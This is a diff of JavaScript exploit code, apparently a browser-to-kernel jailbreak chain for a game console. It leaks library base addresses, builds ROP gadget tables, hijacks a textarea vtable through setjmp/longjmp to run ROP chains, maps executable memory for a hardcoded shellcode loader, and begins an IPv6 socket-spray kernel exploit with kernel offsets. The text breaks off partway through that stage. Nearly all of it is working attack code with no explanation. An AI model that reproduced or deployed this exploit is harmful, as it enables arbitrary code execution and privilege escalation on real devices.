@@ -1,32 +1,32 @@
 var p;
+var chain;
 
-var print = function (x) {
-  document.getElementById("console").innerText += x + "\n";
-}
-var print = function (string) { // like print but html
-  document.getElementById("console").innerHTML += string + "\n";
-}
+var webKitBase;
+var libSceLibcInternalBase;
+var libKernelBase;
 
-var get_jmptgt = function (addr) {
-  var z = p.read4(addr) & 0xFFFF;
-  var y = p.read4(addr.add32(2));
-  if (z != 0x25ff) return 0;
+const OFFSET_wk_vtable_first_element    = 0x00804CD0;
+const OFFSET_WK_memset_import           = 0x00000228;
+const OFFSET_WK___stack_chk_fail_import = 0x000000C8;
+const OFFSET_WK_setjmp_gadget           = 0x0149E6B3;
+const OFFSET_WK_longjmp_gadget          = 0x0143E21E;
+const OFFSET_WK_longjmp_gadget_thread   = 0x01635BBB;
 
-  return addr.add32(y + 6);
-}
 
-var gadgets;
 
-window.stage2 = function () {
-  try {
-    window.stage2_();
-  } catch (e) {
-    print(e);
-  }
-}
+const OFFSET_libcint_memset             = 0x00022F40;
+const OFFSET_libcint_setjmp             = 0x0008BE3C;
+const OFFSET_libcint_longjmp            = 0x0008BEB8;
 
-gadgetcache = {
-  "mov rsp, rdx; jmp rax": 0x01546E00,
+const OFFSET_lk___stack_chk_fail        = 0x00012F70;
+const OFFSET_lk_pthread_create_name_np  = 0x0001BE40;
+const OFFSET_lk_pthread_exit            = 0x0001A3C0;
+const OFFSET_lk_pthread_self            = 0x0001D390;
+const OFFSET_lk_pthread_setschedparam   = 0x0002AEF0;
+
+var syscalls = {};
+var gadgets = {};
+var gadgetmap = {
   "ret": 0x0000003C,
   "pop rdi": 0x0003A5DF,
   "pop rsi": 0x00091D11,
@@ -36,68 +36,62 @@ gadgetcache = {
   "pop r9": 0x0146FF4F,
   "pop rax": 0x00004575,
   "pop rsp": 0x0001F4AD,
+
   "mov [rdi], rax": 0x000BEF5C,
-  "mov rax, [rax]": 0x000F1ABA,
-  "mov [rdi], rsi": 0x00024CE2,
-  "infloop": 0x00003B1F, //debug only
-  
   "mov [rdi], eax": 0x00011C28,
-  "mov rax, r8": 0x002ADD82,
+  "mov [rdi], rsi": 0x00024CE2,
 
-  //branching
-  "mov ebp, [rcx]": 0x029911EC,
-  "sub ebp, edi": 0x0335F9AE,
-  "sub edi, ebp": 0x03475896,
-
-  "adc eax, 0": 0x000FD58A,
-
-  "mov rdx, rax": 0x00362241,
+  "cmp [rcx], edi": 0x02BDA186,
+  "setne al": 0x00005923,
+  "sete al": 0x0000E50B,
+  "setle al": 0x000C31C4,
+  "setl al": 0x00039900,
+  "setge al": 0x00674CDD,
+  "setg al": 0x0035AD3A,
+  "shl rax, 3": 0x005A1DA6,
   "add rax, rdx": 0x00211A83,
-  "imul rax, rcx": 0x008141B6,
+  "mov rax, [rax]": 0x000F1ABA,
+  "inc dword [rax]": 0x0050BBB9,
 };
 
-var setJmpOffset = 0x8be3c;
-var setJmpGadget = 0x149e6b3; // mov rdi, qword ptr [rax + 0x10]; jmp qword ptr [rax + 8];
+//create target textarea to gain execution
+var textArea = document.createElement("textarea");
 
-var longJmpOffset = 0x8beb8;
-var longJmpGadget = 0x143e21e; // mov rdx, qword ptr [rax + 0x10]; call qword ptr [rax + 8]; 
-var longJmpGadget_thread = 0x1635bbb; //mov rdx, qword ptr [rdi + 0xb0]; call qword ptr [rdi + 0x70];
-
-var pthread_create_np_offset = 0x1be40;
-var pthread_exit_offset = 0x1a3c0;
-var libk__error_offset = 0x16700;
-
-var libcint_memset_page_offset = 0x20000;
-var libk_stack_chk_fail_page_offset = 0x10000;
-var libwk_first_vt_entry_offset = 0x804cd0;
-
-window.stage2_ = function () {
+function stage2() {
   p = window.prim;
+  p.launch_chain = launch_chain;
+  p.malloc = malloc;
+  p.malloc32 = malloc32;
+  p.stringify = stringify;
+  p.array_from_address = array_from_address;
 
-  var textArea = document.createElement("textarea");
+  //pointer to vtable address
   var textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
+  //address of vtable
   var textAreaVtable = p.read8(textAreaVtPtr);
-  var webKitBase = p.read8(textAreaVtable).sub32(libwk_first_vt_entry_offset);
-  window.nogc.push(textArea);
+  //use address of 1st entry (in .text) to calculate webkitbase
+  webKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);
 
+  libSceLibcInternalBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_memset_import)));
+  libSceLibcInternalBase.sub32inplace(OFFSET_libcint_memset);
 
-  window.gadgets = {};
+  libKernelBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK___stack_chk_fail_import)));
+  libKernelBase.sub32inplace(OFFSET_lk___stack_chk_fail);
 
-  for (var gadgetname in gadgetcache) {
-    if (gadgetcache.hasOwnProperty(gadgetname)) {
-      window.gadgets[gadgetname] = webKitBase.add32(gadgetcache[gadgetname]);
+  for (var gadget in gadgetmap) {
+    window.gadgets[gadget] = webKitBase.add32(gadgetmap[gadget]);
+  }
+
+  function get_jmptgt(address) {
+    var instr = p.read4(address) & 0xFFFF;
+    var offset = p.read4(address.add32(2));
+    if (instr != 0x25FF) {
+      return 0;
     }
+    return address.add32(0x6 + offset);
   }
 
-  var o2wk = function (o) {
-    return webKitBase.add32(o);
-  }
-  gadgets2 = {
-    "stack_chk_fail": o2wk(0xc8),
-    "memset": o2wk(0x228)
-  };
-
-  p.malloc = function malloc(sz) {
+  function malloc(sz) {
     var backing = new Uint8Array(0x10000 + sz);
     window.nogc.push(backing);
     var ptr = p.read8(p.leakval(backing).add32(0x10));
@@ -105,66 +99,66 @@ window.stage2_ = function () {
     return ptr;
   }
 
-  p.malloc32 = function malloc32(sz) {
+  function malloc32(sz) {
     var backing = new Uint8Array(0x10000 + sz * 4);
     window.nogc.push(backing);
     var ptr = p.read8(p.leakval(backing).add32(0x10));
     ptr.backing = new Uint32Array(backing.buffer);
     return ptr;
   }
-  p.arrayFromAddress = function (addr) {
-    var arr_i = new Uint32Array(0x1000);
-    var arr_ii = p.leakval(arr_i).add32(0x10);
 
-    p.write8(arr_ii, addr);
-    p.write4(arr_ii.add32(8), 0x40000);
+  function array_from_address(addr, size) {
+    var og_array = new Uint32Array(0x1000);
+    var og_array_i = p.leakval(og_array).add32(0x10);
 
-    nogc.push(arr_i);
-    return arr_i;
+    p.write8(og_array_i, addr);
+    p.write4(og_array_i.add32(8), size);
+
+    nogc.push(og_array);
+    return og_array;
   }
 
-  var libSceLibcInternalBase = p.read8(get_jmptgt(gadgets2.memset));
-  window.libSceLibcInternalBase = libSceLibcInternalBase;
-  libSceLibcInternalBase.low &= 0xffffc000;
-  libSceLibcInternalBase.sub32inplace(libcint_memset_page_offset);
-
-  var libKernelBase = p.read8(get_jmptgt(gadgets2.stack_chk_fail));
-  window.libKernelBase = libKernelBase;
-  libKernelBase.low &= 0xffffc000;
-  libKernelBase.sub32inplace(libk_stack_chk_fail_page_offset);
-
-  var fakeVtable = p.malloc32(0x200);
+  function stringify(str) {
+    var bufView = new Uint8Array(str.length + 1);
+    for (var i = 0; i < str.length; i++) {
+      bufView[i] = str.charCodeAt(i) & 0xFF;
+    }
+    window.nogc.push(bufView);
+    return p.read8(p.leakval(bufView).add32(0x10));
+  }
+  var fakeVtable_setjmp = p.malloc32(0x200);
+  var fakeVtable_longjmp = p.malloc32(0x200);
   var original_context = p.malloc32(0x40);
   var modified_context = p.malloc32(0x40);
 
-  var launch_chain = function (chain) {
+  p.write8(fakeVtable_setjmp.add32(0x10), original_context);
+  p.write8(fakeVtable_setjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_setjmp));
+  p.write8(fakeVtable_setjmp.add32(0x1F8), webKitBase.add32(OFFSET_WK_setjmp_gadget)); // mov rdi, qword ptr [rax + 0x10]; jmp qword ptr [rax + 8];
 
+  p.write8(fakeVtable_longjmp.add32(0x10), modified_context);
+  p.write8(fakeVtable_longjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
+  p.write8(fakeVtable_longjmp.add32(0x1F8), webKitBase.add32(OFFSET_WK_longjmp_gadget)); //mov rdx, qword ptr [rax + 0x10]; call qword ptr [rax + 8]; 
+
+  function launch_chain(chain) {
 
     chain.push(window.gadgets["pop rdx"]);
     chain.push(original_context);
-    chain.push(libSceLibcInternalBase.add32(longJmpOffset)); // longjmp
+    chain.push(libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
 
-    p.write8(fakeVtable.add32(0x10), original_context);
-    p.write8(fakeVtable.add32(0x8), libSceLibcInternalBase.add32(setJmpOffset));
-    p.write8(fakeVtable.add32(0x1F8), webKitBase.add32(setJmpGadget)); // mov rdi, qword ptr [rax + 0x10]; jmp qword ptr [rax + 8];
-
-    p.write8(textAreaVtPtr, fakeVtable);
+    p.write8(textAreaVtPtr, fakeVtable_setjmp);
     textArea.scrollLeft = 0x0;
 
     p.write8(modified_context.add32(0x00), window.gadgets["ret"]);
-    p.write8(modified_context.add32(0x10), chain.stack); // RSP = ropStack
-    p.write8(modified_context.add32(0x18), chain.stack); // RBP = ropStack
+    p.write8(modified_context.add32(0x10), chain.stack);
+    p.write8(modified_context.add32(0x40), p.read8(original_context.add32(0x40)));
 
-    p.write8(fakeVtable.add32(0x10), modified_context);
-    p.write8(fakeVtable.add32(0x8), libSceLibcInternalBase.add32(longJmpOffset));
-    p.write8(fakeVtable.add32(0x1F8), webKitBase.add32(longJmpGadget)); //mov rdx, qword ptr [rax + 0x10]; call qword ptr [rax + 8]; 
+    p.write8(textAreaVtPtr, fakeVtable_longjmp);
 
     textArea.scrollLeft = 0x0;
-
-    //p.write8(textAreaVtPtr, textAreaVtable);
+    p.write8(textAreaVtPtr, textAreaVtable);
   }
 
-  p.loadchain = launch_chain;
+
 
   var kview = new Uint8Array(0x1000);
   var kstr = p.leakval(kview).add32(0x10);
@@ -172,7 +166,6 @@ window.stage2_ = function () {
 
   p.write8(kstr, window.libKernelBase);
   p.write4(kstr.add32(8), 0x40000);
-
   var countbytes;
   for (var i = 0; i < 0x40000; i++) {
     if (kview[i] == 0x72 && kview[i + 1] == 0x64 && kview[i + 2] == 0x6c && kview[i + 3] == 0x6f && kview[i + 4] == 0x63) {
@@ -194,88 +187,13 @@ window.stage2_ = function () {
       window.syscalls[syscallno] = window.libKernelBase.add32(i);
     }
   }
-  var chain = new rop();
-  var returnvalue;
+  p.write8(kstr, orig_kview_buf);
 
-
-  p.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
-    chain.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
-
-    chain.push(window.gadgets["pop rdi"]);
-    chain.push(chain.retval);
-    chain.push(window.gadgets["mov [rdi], rax"]);
-
-    chain.run();
-    returnvalue = p.read8(chain.retval);
-    return returnvalue;
-  }
-
-  p.readstr = function (addr) {
-    var addr_ = addr.add32(0);
-    var rd = p.read4(addr_);
-    var buf = "";
-    while (rd & 0xFF) {
-      buf += String.fromCharCode(rd & 0xFF);
-      addr_.add32inplace(1);
-      rd = p.read4(addr_);
-    }
-    return buf;
-  }
-
-  p.syscall = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
-    if (typeof sysc == "string") {
-      sysc = window.syscallnames[sysc];
-    }
-    if (typeof sysc != "number") {
-      throw new Error("invalid syscall");
-    }
-
-    var off = window.syscalls[sysc];
-    if (off == undefined) {
-      throw new Error("invalid syscall");
-    }
-
-    return p.fcall(off, rdi, rsi, rdx, rcx, r8, r9);
-  }
-
-  p.stringify = function (str) {
-    var bufView = new Uint8Array(str.length + 1);
-    for (var i = 0; i < str.length; i++) {
-      bufView[i] = str.charCodeAt(i) & 0xFF;
-    }
-    window.nogc.push(bufView);
-    return p.read8(p.leakval(bufView).add32(0x10));
-  };
-
-  var spawn_thread = function (name, chaino) {
-    var new_thr = new rop();
-    var context = p.malloc(0x1b8);
-    var arg = context.add32(0x100);
-
-    p.write8(context.add32(0x0), window.gadgets["ret"]);
-    p.write8(context.add32(0x10), new_thr.stack);
-    new_thr.push(window.gadgets["ret"]);
-    chaino(new_thr);
-    p.write8(context, window.gadgets["ret"]);
-    p.write8(context.add32(0x10), new_thr.stack);
-
-    p.write8(arg.add32(0xB0), context);
-    p.write8(arg.add32(0x70), libSceLibcInternalBase.add32(longJmpOffset)); // longjmp
-    //mov rdx, qword ptr [rdi + 0xb0]; call qword ptr [rdi + 0x70];
-
-    var retv = function () {
-      p.fcall(libKernelBase.add32(pthread_create_np_offset), context.add32(0x48), 0, webKitBase.add32(longJmpGadget_thread), arg, p.stringify(name));
-    }
-    window.nogc.push(new_thr);
-    window.nogc.push(context);
-
-    return retv;
-  }
-  var t = p.syscall("sys_setuid", 0);
-  if (t.low == 0) {
-    var payload_buffer = p.syscall(477, 0, 0x300000, 7, 0x41000, -1, 0);
-
+  chain = new rop();
+  if (chain.syscall(23, 0).low == 0x0) {
+    var payload_buffer = chain.syscall(477, 0, 0x300000, 7, 0x41000, -1, 0);
     var payload_loader = p.malloc32(0x1000);
+
     var loader_writer = payload_loader.backing;
     loader_writer[0] = 0x56415741;
     loader_writer[1] = 0x83485541;
@@ -339,31 +257,26 @@ window.stage2_ = function () {
     loader_writer[59] = 0x89490000;
     loader_writer[60] = 0xC3050FCA;
 
-    p.syscall(74, payload_loader, 0x4000, (0x1 | 0x2 | 0x4));
+    chain.syscall(74, payload_loader, 0x4000, (0x1 | 0x2 | 0x4));
 
-    var loader_thr = spawn_thread("loader_thr", function (new_thr) {
+    var loader_thr = chain.spawn_thread("loader_thr", function (new_thr) {
       new_thr.push(window.gadgets["pop rdi"]);
       new_thr.push(payload_buffer);
       new_thr.push(payload_loader);
-      new_thr.push(window.gadgets["pop rdi"]);
-      new_thr.push(0);
-      new_thr.push(libKernelBase.add32(pthread_exit_offset)); //pthread_exit
-
+      new_thr.fcall(libKernelBase.add32(OFFSET_lk_pthread_exit), 0);
     });
     loader_thr();
     awaitpl();
-    return;
+  } else {
+    try {
+      stage3();
+    } catch (e) {
+      alert(e);
+    }
   }
-  /*
-  var userland_buffer = p.syscall(477, 0, 0x4A00000, 3, 0x1000, -1, 0);
-  p.syscall(324, 1);
-  alert("u buffer = 0x" + userland_buffer);
-  p.fcall(gadgets2.memset, userland_buffer, 0x00, 0x4A00000);
-  alert("memset");
-*/
-  //p.syscall(324, 2);
-  //gets calling thr's errno pointer
-  const errno_location = p.fcall(libKernelBase.add32(libk__error_offset));
+}
+
+function stage3() {
 
   const AF_INET6 = 28;
   const SOCK_DGRAM = 2;
@@ -376,863 +289,635 @@ window.stage2_ = function () {
 
   const SPRAY_TCLASS = 0x53;
   const TAINT_CLASS = 0x58;
-  const NANOSLEEP_TIME = 0x249F0; //150µs
   const TCLASS_MASTER = 0x2AFE0000;
-  const TCLASS_MASTER2 = 0x3EEF0000;
 
   const PKTOPTS_PKTINFO_OFFSET = 0x10;
   const PKTOPTS_RTHDR_OFFSET = 0x68;
   const PKTOPTS_TCLASS_OFFSET = 0xB0;
 
-  const KNOTE_KN_OFFSET = 0x60;
-  const KERNEL_SOCKETOPS_OFFSET = 0x153FF80; //kernel offset
+  const PROC_UCRED_OFFSET = 0x40;
+  const PROC_FILEDESC_OFFSET = 0x48;
+  const PROC_PID_OFFSET = 0xB0;
 
-  const NUM_SPRAY_SOCKS = 0xC8;
-  const NUM_LEAK_SOCKS = 0xC8;
-  const NUM_SLAVE_SOCKS = 0xC8;
-  const NUM_KQUEUES = 0x96;
 
-  //memory block
-  const size_of_triggered_ptr = 0x8;
-  const size_of_valid_buf = 0x18;
-  const size_of_nanosleep_ptr = 0x10;
-  const size_of_spray_class = 0x8;
-  const size_of_master_class = 0x8;
-  const size_of_master_class2 = 0x8;
-  const size_of_master_class3 = 0x8;
-  const size_of_master_class_sz = 0x8;
-  const size_of_msg_print = 0x10;
-  const size_of_taint_class = 0x8;
-  const size_of_tmp_class = 0x8;
-  const size_of_rthdr_buf = 0x800;
-  const size_of_master_sock_ptr = 0x8;
-  const size_of_spray_socks_ptr = NUM_SPRAY_SOCKS * 0x4;
-  const size_of_leak_socks_ptr = NUM_LEAK_SOCKS * 0x4;
-  const size_of_slave_socks_ptr = NUM_SLAVE_SOCKS * 0x4;
-  const size_of_find_overlap_ptr = NUM_SPRAY_SOCKS * 0x4;
-  const size_of_rthdr_buf_len_ptr = 0x8;
-  const size_of_spare_sock_ptr = 0x8;
-  const size_of_kernel_read_buf_ptr = 0x18;
-  const size_of_kernel_read_buf_len_ptr = 0x18;
-  const size_of_slave_buf_ptr = 0x18;
-  const size_of_slave_buf_len_ptr = 0x18;
-  const size_of_find_slave_buf_ptr = 0x8 * NUM_SLAVE_SOCKS + 0x10
-  const size_of_kqueues_ptr = NUM_KQUEUES * 0x4;
-  const size_of_kevent_ptr = 0x20;
-  const size_of_kevent_sock_ptr = 0x8;
-  const size_of_fake_sockopts = 11 * 0x8;
-  const var_memory = p.malloc(size_of_triggered_ptr + size_of_valid_buf + size_of_nanosleep_ptr + size_of_spray_class + size_of_master_class + size_of_master_class2 +
-    size_of_master_class3 + size_of_master_class_sz + size_of_msg_print + size_of_taint_class + size_of_tmp_class + size_of_rthdr_buf + size_of_master_sock_ptr +
-    size_of_spray_socks_ptr + size_of_leak_socks_ptr + size_of_slave_socks_ptr + size_of_find_overlap_ptr + size_of_rthdr_buf_len_ptr + size_of_spare_sock_ptr +
-    size_of_kernel_read_buf_ptr + size_of_kernel_read_buf_len_ptr + size_of_slave_buf_ptr + size_of_slave_buf_len_ptr + size_of_find_slave_buf_ptr + size_of_kqueues_ptr +
-    size_of_kevent_ptr + size_of_kevent_sock_ptr + size_of_fake_sockopts);
+  const FILE_FOPS_OFFSET = 0x8;
+  const FILEOPS_IOCTL_OFFSET = 0x18;
+  const VM_MAP_PMAP_OFFSET = 0x120;
 
-  const triggered_ptr = var_memory;
-  const valid_buf = triggered_ptr.add32(size_of_triggered_ptr);
-  const nanosleep_ptr = valid_buf.add32(size_of_valid_buf);
-  const spray_class = nanosleep_ptr.add32(size_of_nanosleep_ptr);
-  const master_class = spray_class.add32(size_of_spray_class);
-  const master_class2 = master_class.add32(size_of_master_class);
-  const master_class3 = master_class2.add32(size_of_master_class2);
-  const master_class_sz = master_class3.add32(size_of_master_class3);
-  const msg_print = master_class_sz.add32(size_of_master_class_sz);
-  const taint_class = msg_print.add32(size_of_taint_class);
-  const tmp_class = taint_class.add32(size_of_msg_print);
-  const rthdr_buf = tmp_class.add32(size_of_tmp_class);
-  const master_sock_ptr = rthdr_buf.add32(size_of_rthdr_buf);
-  const spray_socks_ptr = master_sock_ptr.add32(size_of_master_sock_ptr);
-  const leak_socks_ptr = spray_socks_ptr.add32(size_of_spray_socks_ptr);
-  const slave_socks_ptr = leak_socks_ptr.add32(size_of_leak_socks_ptr);
-  const find_overlap_ptr = slave_socks_ptr.add32(size_of_slave_socks_ptr);
-  const rthdr_buf_len_ptr = find_overlap_ptr.add32(size_of_find_overlap_ptr);
-  const spare_sock_ptr = rthdr_buf_len_ptr.add32(size_of_rthdr_buf_len_ptr);
-  const kernel_read_buf_ptr = spare_sock_ptr.add32(size_of_spare_sock_ptr);
-  const kernel_read_buf_len_ptr = kernel_read_buf_ptr.add32(size_of_kernel_read_buf_ptr);
-  const slave_buf_ptr = kernel_read_buf_len_ptr.add32(size_of_kernel_read_buf_len_ptr);
-  const slave_buf_len_ptr = slave_buf_ptr.add32(size_of_slave_buf_ptr);
-  const find_slave_buf_ptr = slave_buf_len_ptr.add32(size_of_slave_buf_len_ptr);
-  const kqueues_ptr = find_slave_buf_ptr.add32(size_of_find_slave_buf_ptr);
-  const kevent_ptr = kqueues_ptr.add32(size_of_kqueues_ptr);
-  const kevent_sock_ptr = kevent_ptr.add32(size_of_kevent_ptr);
-  const fake_sockopts = kevent_sock_ptr.add32(size_of_kevent_sock_ptr);
-  p.write8(rthdr_buf_len_ptr, 0x100);
+  const KERNEL_M_IP6OPT_OFFSET = 0x1A8F040;
+  const KERNEL_MALLOC_OFFSET = 0x466AE0;
+  const KERNEL_ALLPROC_OFFSET = 0x218D0E8;
+  const KERNEL_PMAP_STORE_OFFSET = 0x22A0BA0;
+
+  const NUM_SPRAY_SOCKS = 200;
+  const NUM_LEAK_SOCKS = 200;
+  const NUM_SLAVE_SOCKS = 300;
+
+  const size_of_triggered = 0x8;
+  const size_of_valid_pktopts = 0x18;
+  const size_of_size_of_tclass = 0x8;
+  const size_of_master_main_tclass = 0x8;
+  const size_of_master_thr1_tclass = 0x8;
+  const size_of_master_thr2_tclass = 0x8;
+  const size_of_spray_tclass = 0x8;
+  const size_of_taint_tclass = 0x8;
+  const size_of_tmp_tclass = 0x8;
+  const size_of_rthdr_buffer = 0x800;
+  const size_of_ptr_size_of_rthdr_buffer = 0x8;
+  const size_of_spray_socks = 0x4 * NUM_SPRAY_SOCKS;
+  const size_of_leak_socks = 0x4 * NUM_LEAK_SOCKS;
+  const size_of_slave_socks = 0x4 * NUM_SLAVE_SOCKS;
+  const size_of_spray_socks_tclasses = 0x4 * NUM_SPRAY_SOCKS;
+  const size_of_pktinfo_buffer = 0x18;
+  const size_of_pktinfo_buffer_len = 0x8
+  const size_of_find_slave_buffer = 0x8 * NUM_SLAVE_SOCKS + 0x10;
+  const size_of_fake_socketops = 0x58;
+  const size_of_loop_counter = 0x8;
+  const size_of_fix_these_sockets = 0x4 * (NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS + NUM_SLAVE_SOCKS + 0x2) + 0x18;
+  const var_memory = p.malloc(size_of_triggered + size_of_valid_pktopts + size_of_size_of_tclass + size_of_master_main_tclass + size_of_master_thr1_tclass + size_of_master_thr2_tclass + size_of_spray_tclass + size_of_taint_tclass + size_of_tmp_tclass +
+    size_of_rthdr_buffer + size_of_ptr_size_of_rthdr_buffer + size_of_spray_socks + size_of_leak_socks + size_of_slave_socks + size_of_spray_socks_tclasses + size_of_pktinfo_buffer + size_of_pktinfo_buffer_len + size_of_find_slave_buffer + size_of_fake_socketops + size_of_loop_counter +
+    size_of_fix_these_sockets
+  );
+
+  const triggered = var_memory;
+  const valid_pktopts = triggered.add32(size_of_triggered);
+  const size_of_tclass = valid_pktopts.add32(size_of_valid_pktopts);
+  const master_main_tclass = size_of_tclass.add32(size_of_size_of_tclass);
+  const master_thr1_tclass = master_main_tclass.add32(size_of_master_main_tclass);
+  const master_thr2_tclass = master_thr1_tclass.add32(size_of_master_thr1_tclass);
+  const spray_tclass = master_thr2_tclass.add32(size_of_master_thr2_tclass);
+  const taint_tclass = spray_tclass.add32(size_of_spray_tclass);
+  const tmp_tclass = taint_tclass.add32(size_of_taint_tclass);
+  const rthdr_buffer = tmp_tclass.add32(size_of_tmp_tclass);
+  const ptr_size_of_rthdr_buffer = rthdr_buffer.add32(size_of_rthdr_buffer);
+  const spray_sockets_ptr = ptr_size_of_rthdr_buffer.add32(size_of_ptr_size_of_rthdr_buffer);
+  const leak_sockets_ptr = spray_sockets_ptr.add32(size_of_spray_socks);
+  const slave_sockets_ptr = leak_sockets_ptr.add32(size_of_leak_socks);
+  const spray_socks_tclasses_ptr = slave_sockets_ptr.add32(size_of_slave_socks);
+  const pktinfo_buffer = spray_socks_tclasses_ptr.add32(size_of_spray_socks_tclasses);
+  const pktinfo_buffer_len = pktinfo_buffer.add32(size_of_pktinfo_buffer);
+  const find_slave_buffer = pktinfo_buffer_len.add32(size_of_pktinfo_buffer_len);
+  const fake_socketops = find_slave_buffer.add32(size_of_find_slave_buffer);
+  const loop_counter = fake_socketops.add32(size_of_fake_socketops);
+  const fix_these_sockets_ptr = loop_counter.add32(size_of_loop_counter);
 
   var overlapped_socket = -1;
   var overlapped_socket_idx = -1;
-  var victim_sock = -1;
-  var victim_sock_idx = -1;
 
-  var pktopts_leak_addr = 0;
-  var kevent_leak_addr = 0;
-  var kernel_base = 0;
+  var slave_socket = -1;
 
-  for (var i = 0; i < 10; i++) {
-    p.write8(fake_sockopts.add32(i * 0x8), window.gadgets["ret"]);
+  var leaked_pktopts_address = 0;
+
+  var target_file;
+  var socketops;
+  var kernel_base;
+
+  p.write8(valid_pktopts.add32(0x0), 0x14);
+  p.write4(valid_pktopts.add32(0x8), IPPROTO_IPV6);
+  p.write4(valid_pktopts.add32(0xC), IPV6_TCLASS);
+  p.write4(valid_pktopts.add32(0x10), 0x0);
+
+  p.write8(size_of_tclass, 0x4);
+  p.write8(spray_tclass, SPRAY_TCLASS);
+
+  p.write8(master_main_tclass, 0x0);
+  p.write8(master_thr1_tclass, 0x0);
+  p.write8(master_thr2_tclass, 0x0);
+
+  p.write8(taint_tclass, TAINT_CLASS);
+  p.write8(tmp_tclass, 0x10);
+
+  p.write8(pktinfo_buffer_len, 0x14)
+
+  //create sockets
+  const master_socket = chain.syscall(97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP).low;
+  const target_socket = chain.syscall(97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP).low;
+  const spare_socket = chain.syscall(97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP).low;
+
+  const this_pid = chain.syscall(20).low;
+
+  {
+
+    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
+      chain.fcall(window.syscalls[97], AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
+      chain.write_result4(spray_sockets_ptr.add32(0x4 * i));
+    }
+    for (var i = 0; i < NUM_LEAK_SOCKS; i++) {
+      chain.fcall(window.syscalls[97], AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
+      chain.write_result4(leak_sockets_ptr.add32(0x4 * i));
+    }
+    for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
+      chain.fcall(window.syscalls[97], AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
+      chain.write_result4(slave_sockets_ptr.add32(0x4 * i));
+    }
   }
-  p.write8(fake_sockopts.add32(0x50), 1);
+  chain.run();
 
-  p.write8(triggered_ptr, 0);
+  const spray_sockets = p.array_from_address(spray_sockets_ptr, NUM_SPRAY_SOCKS);
+  const spray_socks_tclasses = p.array_from_address(spray_socks_tclasses_ptr, NUM_SPRAY_SOCKS);
 
-  p.write8(valid_buf.add32(0x0), 0x14);
-  p.write8(valid_buf.add32(0x8), IPPROTO_IPV6);
-  p.write8(valid_buf.add32(0xC), IPV6_TCLASS);
-  p.write8(valid_buf.add32(0x10), 0x0);
+  const leak_sockets = p.array_from_address(leak_sockets_ptr, NUM_LEAK_SOCKS);
+  const slave_sockets = p.array_from_address(slave_sockets_ptr, NUM_SLAVE_SOCKS);
 
-  p.write8(nanosleep_ptr.add32(0x0), 0x0);
-  p.write8(nanosleep_ptr.add32(0x8), NANOSLEEP_TIME);
+  const fix_me = p.array_from_address(fix_these_sockets_ptr, NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS + NUM_SLAVE_SOCKS + 0x2);
 
-  p.write8(spray_class, SPRAY_TCLASS);
-
-  p.write8(master_class, 0x0);
-  p.write8(master_class2, 0x0);
-  p.write8(master_class3, 0x0);
-  p.write8(master_class_sz, 0x4);
-
-  p.write4(msg_print.add32(0x0), 0x4C4C4548);
-  p.write4(msg_print.add32(0x4), 0x4F57204F);
-  p.write4(msg_print.add32(0x8), 0x5C444C52);
-  p.write4(msg_print.add32(0xC), 0x0000006E);
-
-  p.write8(taint_class, TAINT_CLASS);
-  p.write8(tmp_class, 0x10);
-
-  for (var i = 0; i < 0x800; i += 8) {
-    p.write8(rthdr_buf.add32(i), 0);
-  }
-  p.write4(rthdr_buf, 0x0F001E00);
-
-  p.write8(kernel_read_buf_len_ptr, 0x14);
-  p.write8(slave_buf_len_ptr, 0x14);
-
-  chain.clear();
-  chain.fcall(window.syscalls[97], AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
-  chain.push(window.gadgets["pop rdi"]);
-  chain.push(master_sock_ptr);
-  chain.push(window.gadgets["mov [rdi], rax"]);
-  chain.fcall(window.syscalls[97], AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
-  chain.push(window.gadgets["pop rdi"]);
-  chain.push(kevent_sock_ptr);
-  chain.push(window.gadgets["mov [rdi], rax"]);
   for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
-    chain.fcall(window.syscalls[97], AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
-    chain.push(window.gadgets["pop rdi"]);
-    chain.push(spray_socks_ptr.add32(0x4 * i));
-    chain.push(window.gadgets["mov [rdi], eax"]);
+    fix_me[i] = spray_sockets[i];
   }
   for (var i = 0; i < NUM_LEAK_SOCKS; i++) {
-    chain.fcall(window.syscalls[97], AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
-    chain.push(window.gadgets["pop rdi"]);
-    chain.push(leak_socks_ptr.add32(0x4 * i));
-    chain.push(window.gadgets["mov [rdi], eax"]);
+    fix_me[i + NUM_SPRAY_SOCKS] = leak_sockets[i];
   }
   for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
-    chain.fcall(window.syscalls[97], AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
-    chain.push(window.gadgets["pop rdi"]);
-    chain.push(slave_socks_ptr.add32(0x4 * i));
-    chain.push(window.gadgets["mov [rdi], eax"]);
+    fix_me[i + (NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS)] = slave_sockets[i];
   }
-  chain.fcall(window.syscalls[97], AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
-  chain.push(window.gadgets["pop rdi"]);
-  chain.push(spare_sock_ptr);
-  chain.push(window.gadgets["mov [rdi], rax"]);
-  for (var i = 0; i < NUM_KQUEUES; i++) {
-    chain.fcall(window.syscalls[362]);
-    chain.push(window.gadgets["pop rdi"]);
-    chain.push(kqueues_ptr.add32(0x4 * i));
-    chain.push(window.gadgets["mov [rdi], eax"]);
+
